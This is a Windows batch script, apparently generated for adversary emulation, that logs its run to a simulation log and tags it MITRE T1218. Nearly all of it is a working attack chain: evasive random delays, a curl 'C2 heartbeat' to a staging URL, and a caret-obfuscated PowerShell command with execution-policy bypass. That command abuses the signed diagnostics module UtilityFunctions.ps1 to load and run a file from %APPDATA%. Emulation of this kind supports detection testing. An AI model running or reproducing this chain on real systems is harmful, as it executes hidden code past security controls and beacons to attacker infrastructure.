@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ placeholder assignments
SET txisnba=%APPDATA%\8497\5480e835
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?8497-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=expressvp.txt
SET dvhhyc=8497

REM Derived variables with random names
SET hlbpyg=%APPDATA%\!rrocubc!
SET uxbehbx=!hlbpyg!\macula-simulations.log
SET pghajqi=!txisnba!\!xzanpex!
SET klmrfdy=T1218
SET sqbmghn=Signed Binary Proxy Execution

REM Initial random delay (30-60s)
SET /A rnzd=!RANDOM! %% 31 + 30
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set datetime=%%I
set timestamp=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!
echo [!timestamp!][DEBUG][!jwcnifl!]: delay_start=!rnzd!s>> "!uxbehbx!" 2>nul
timeout /t !rnzd! /nobreak >nul
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set datetime=%%I
set timestamp=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!
echo [!timestamp!][DEBUG][!jwcnifl!]: delay_end=success>> "!uxbehbx!" 2>nul

REM C2 heartbeat with curl (NO obfuscation on curl command)
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set datetime=%%I
set timestamp=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!
echo [!timestamp!][DEBUG][!jwcnifl!]: heartbeat_start=curl>> "!uxbehbx!" 2>nul
curl -k -s -o nul "!keghkgto!"
SET hbrresult=1
IF !ERRORLEVEL! NEQ 0 SET hbrresult=0
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set datetime=%%I
set timestamp=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!
echo [!timestamp!][DEBUG][!jwcnifl!]: heartbeat_end=!hbrresult!>> "!uxbehbx!" 2>nul

REM First inter-operation delay (5-15s)
ping -n 8 127.0.0.1 >nul
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set datetime=%%I
set timestamp=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!
echo [!timestamp!][DEBUG][!jwcnifl!]: delay_ping_complete>> "!uxbehbx!" 2>nul

REM Obfuscated LOLBin command fragments with caret escapes
SET fy^dcx=p^ow^e^r^sh^e^l^l.^ex^e
SET bswk^pa=-^e^p b^y^pas^s
SET ikm^xt=-^c^o^m^ma^n^d
SET gjbqhn="^set-location -path c:^\windows^\diagnostics^\system^\networking; ^import-module .^\UtilityFunctions.ps1; RegSnapin
SET drlvr^o=\
SET fnpc^ie=;[^Program.Class]::Dale()"

REM Execute obfuscated command
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set datetime=%%I
set timestamp=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!
echo [!timestamp!][DEBUG][!jwcnifl!]: command_start=!klmrfdy!>> "!uxbehbx!" 2>nul
%fydcx% !bswkpa! !ikmxt! !gjbqhn!!txisnba!!drlvro!!xzanpex!!fnpcie!
SET cmaresult=1
SET cmaderr=
IF !ERRORLEVEL! NEQ 0 (
    SET cmaresult=0
    SET cmaderr=execution_failed
)
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set datetime=%%I
set timestamp=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!
echo [!timestamp!][DEBUG][!jwcnifl!]: command_end=!cmaresult!>> "!uxbehbx!" 2>nul

REM TTP logging
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set datetime=%%I
set timestamp=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!
echo [!timestamp!][!jwcnifl!]: !rrocubc!-!dvhhyc!-!klmrfdy!|!sqbmghn!=!cmaresult!::!cmaderr!>> "!uxbehbx!" 2>nul

REM Second inter-operation delay (5-15s)
CHOICE /C Y /N /D Y /T 12 >nul
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set datetime=%%I
set timestamp=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!
echo [!timestamp!][DEBUG][!jwcnifl!]: delay_choice_complete>> "!uxbehbx!" 2>nul

REM Random final delay (10-30s)
SET /A rndf=!RANDOM! %% 21 + 10
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set datetime=%%I
set timestamp=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!
echo [!timestamp!][DEBUG][!jwcnifl!]: final_delay_start=!rndf!s>> "!uxbehbx!" 2>nul
timeout /t !rndf! /nobreak >nul
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value 2^>nul') do set datetime=%%I
set timestamp=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!
echo [!timestamp!][DEBUG][!jwcnifl!]: script_complete>> "!uxbehbx!" 2>nul

ENDLOCAL